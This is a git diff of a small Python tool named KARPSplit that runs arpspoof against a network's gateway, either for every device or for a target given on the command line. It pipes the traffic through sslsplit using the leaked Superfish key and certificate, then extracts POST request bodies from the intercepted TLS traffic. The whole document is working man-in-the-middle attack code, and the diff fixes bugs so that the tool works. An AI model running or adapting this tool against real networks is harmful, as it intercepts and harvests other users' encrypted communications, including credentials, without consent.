@@ -3,6 +3,7 @@ from subprocess import PIPE
 import netifaces
 import re
 import time
+import sys
 
 
 def arpspoof(target = None):
@@ -11,25 +12,25 @@ def arpspoof(target = None):
     print("Found gateway " + gateway)
     interface = "eth0"
     if target is None:
-        spoofer = subprocess.call(["arpspoof", "-i " + interface, gateway])
+        spoofer = subprocess.Popen(["arpspoof", "-i", interface, gateway], stdout=PIPE)
     else:
-        spoofer = subprocess.call(["arpspoof", "-i " + interface, "-t " + victim, gateway])
+        spoofer = subprocess.Popen(["arpspoof", "-i", interface, "-t", target, gateway], stdout=PIPE)
     return spoofer
 
 
 def sslsplit():
-    splitter = subprocess.Popen(["sslsplit", "-k", "/root/superfishy-master/certificates/superfish-unprotected.key", "-c", "/root/superfishy-master/certificates/superfish.crt", "-L", "/dev/stdout", "ssl 0.0.0.0 8443"], stdout=PIPE)
+    splitter = subprocess.Popen(["sslsplit", "-k", "/root/superfishy-master/certificates/superfish-unprotected.key", "-c", "/root/superfishy-master/certificates/superfish.crt", "-L", "/dev/stdout", "ssl", "0.0.0.0", "8443"], stdout=PIPE)
     return splitter
 
 
 def read_output(pipe):
-    rp = open(pipe, 'r')
+
     # https://regex101.com/r/wA9oY4/1
 
     # infinite loop
     while 1:
         # read all new data if any is available
-        conn_details = rp.read()
+        conn_details = pipe.read()
         # if there is new data
         if conn_details != "":
             p = re.compile("(POST)(.*?)(?=GET|POST|\Z)", re.DOTALL)
@@ -51,9 +52,14 @@ def read_output(pipe):
                     print()
             time.sleep(2)
 
+
 print("KARPSplit v0.1\n")
-print("Starting ARP Spoof...")
-arpspoof()
+if len(sys.argv) > 1:
+    print("Starting ARP Spoof on " + sys.argv[1] + "...")
+    arpspoof(sys.argv[1])
+else:
+    print("Starting ARP Spoof on all devices...")
+    arpspoof()
 time.sleep(1)
 print("Starting SSLSplit...")
 splitter = sslsplit()
